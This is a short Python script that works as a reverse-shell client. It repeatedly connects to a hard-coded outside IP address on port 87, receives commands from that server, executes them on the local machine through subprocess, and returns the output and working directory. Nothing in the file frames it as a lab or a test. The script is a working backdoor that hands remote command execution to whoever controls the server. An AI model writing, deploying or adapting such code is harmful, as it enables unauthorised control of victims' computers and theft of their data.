import socket
import time
import os
import subprocess

HEADER = 128
PORT = 87
# SERVER = "127.0.0.1"
SERVER = "46.101.213.187"
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
ADDR = (SERVER, PORT)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def send(msg):
    msg_encoded = msg.encode(FORMAT)
    msg_len = len(msg_encoded)
    msg_len_encoded = str(msg_len).encode(FORMAT)
    msg_len_encoded += b" " * (HEADER - len(str(msg_len)))
    client.send(msg_len_encoded)
    client.send(msg_encoded)


def receive(conn):
    msg_len = conn.recv(HEADER).decode(FORMAT)
    if not msg_len.strip(): return ""  # if message is blank ignore it
    # puts it into int from string
    msg_len = int(msg_len)
    msg = conn.recv(msg_len).decode(FORMAT)
    return msg


def is_still_connected(sock):
    try:
        sock.sendall(b"")
    except:
        return False
    return True


def connect(addr):
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect(ADDR)
        return True
    except:
        return False
        time.sleep(10)


def main():
    while True:
        while True:
            if connect(ADDR): break
        while True:
            command = ""
            output = ""
            try:
                command = receive(client).lower()
            except:
                break
            if command == "": continue
            if command in ["exit", "disconnect"]:
                break
            split_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if split_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(split_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                if command == "exit":
                    send(DISCONNECT_MESSAGE)
                    exit()
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            send(output)
            send(cwd)
        if command == "exit":
            break
    send(DISCONNECT_MESSAGE)
    client.close()


if __name__ == "__main__":
    main()
